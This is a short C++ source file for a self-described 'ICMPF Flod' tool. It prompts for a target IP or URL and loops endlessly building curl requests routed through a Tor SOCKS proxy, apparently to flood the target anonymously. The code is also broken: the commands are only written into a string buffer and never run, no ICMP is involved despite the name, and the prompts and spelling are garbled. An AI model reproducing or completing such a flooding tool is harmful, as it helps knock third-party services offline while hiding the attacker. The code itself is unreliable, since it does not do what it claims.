#include <iostream>
#include <string>
#include <sstream>
#include "resources/curly.hpp"
#include "resources/termcolor.hpp"

using namespace std;
ostringstream ss;
void icmpf()
{
   cout << termcolor::red;
   cout << "You need ICMPF Flod for --URL or --IP?: ";
   string urlorip;
   cin >> urlorip;
   if (urlorip == "--ip") {
     string ip;
     cout << "Enter a ip adress: ";
     cin >> ip;
     while (true) {
        ss << "curl --socks5-hostname 127.0.0.1:9050 https://" << ip;
     }
   } else if (urlorip == "--url") {
        string url;
        cout << "Enter a ip adress: ";
        cin >> url;
        while (true) {
            ss << "curl --socks5-hostname 127.0.0.1:9050 https://" << url;
     }
    } else {
        cout << "EROR" << endl;
        icmpf();
    }
}
